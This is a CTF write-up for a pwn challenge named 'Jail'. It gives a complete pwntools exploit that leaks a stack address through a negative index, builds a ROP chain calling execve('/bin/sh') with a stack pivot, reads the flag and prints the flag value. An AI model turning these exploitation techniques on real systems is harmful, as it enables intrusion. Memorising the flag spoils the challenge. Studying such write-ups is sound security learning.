https://ctftime.org/event/2708

# Jail (pwn)

I want to become a dentist! A DENTIST?!

nc 20.84.72.194 5001

## Solution

1) Leak address of the stack
2) Stack pivot via pop rsp gadget

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./prison", checksec=False)
context.binary = elf
context.terminal = ["tmux", "splitw", "-h"]

#p = elf.process()
#p = elf.debug(gdbscript="b *0x00401ad3")
p = remote("20.84.72.194", 5001)

p.sendlineafter(b"choose your cell (1-6): ", str(-1).encode())

p.readuntil(b"cellmate is ")
leak = u64(p.readline()[:-1].ljust(8, b"\x00"))
buf = leak - 0x50

rop = ROP(elf)
rop.rdi = buf + 0x40
rop.rsi = 0
rop.rax = constants.SYS_execve
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])
payload = rop.chain()

POP_RSP = 0x00000000004450f8 #: pop rsp ; ret
rop = ROP(elf)
rop.raw(payload.ljust(0x40, b"A"))
rop.raw(b"/bin/sh\x00")
rop.raw(p64(POP_RSP))
rop.raw(p64(buf))

p.sendlineafter(b"What is your name: ", rop.chain())

p.sendline(b"/bin/cat flag.txt")

p.readuntil(b"squ1rrel{")
print("squ1rrel{" + p.readuntil(b"}").decode()) # squ1rrel{m4n_0n_th3_rUn_fr0m_NX_pr1s0n!}
```

## Flag
`squ1rrel{m4n_0n_th3_rUn_fr0m_NX_pr1s0n!}`

smiley 2025/04/05
